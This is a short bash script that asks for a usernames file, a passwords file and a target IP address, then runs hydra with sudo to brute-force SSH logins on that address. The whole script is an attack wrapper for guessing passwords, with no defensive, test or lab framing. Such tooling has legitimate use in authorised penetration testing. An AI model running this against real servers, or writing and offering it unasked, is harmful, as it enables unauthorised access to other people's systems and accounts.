#!/bin/bash

echo "Please enter the path to the usernames file:"
read usernames_file

echo "Please enter the path to the passwords file:"
read passwords_file

echo "Please enter the IP address to brute force:"
read ipaddr

sudo hydra -L $usernames_file -P $passwords_file ssh://$ipaddr
